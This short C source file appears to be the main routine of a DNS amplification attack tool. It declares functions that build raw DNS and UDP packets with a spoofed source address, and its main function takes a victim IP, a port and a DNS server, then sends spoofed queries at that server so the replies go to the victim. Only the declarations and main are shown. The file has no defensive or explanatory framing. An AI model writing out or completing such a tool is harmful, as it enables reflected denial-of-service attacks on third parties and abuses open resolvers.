#include "dnsamp.h"

void Print_error(char* error);
void SendDnsPacket(char* dnsip, char* spoofip, int port);
void CreateDnsHeader(dh *dns);
void CreateQueryInfo(query *q);
void CreatePseudoHeader(ph *psheader, char* spoofip, char* dnsip);
unsigned short CheckIpUdpSum(int length, unsigned char *ptr);

int main(int argc, char *argv[]){
	int i = 0;
	char* victim = argv[1];
	int udp_port = atoi(argv[2]);
	char* dns_server = argv[3];

	for(;i < 3; i++)
		SendDnsPacket(dns_server, victim, udp_port);

	return 0;
}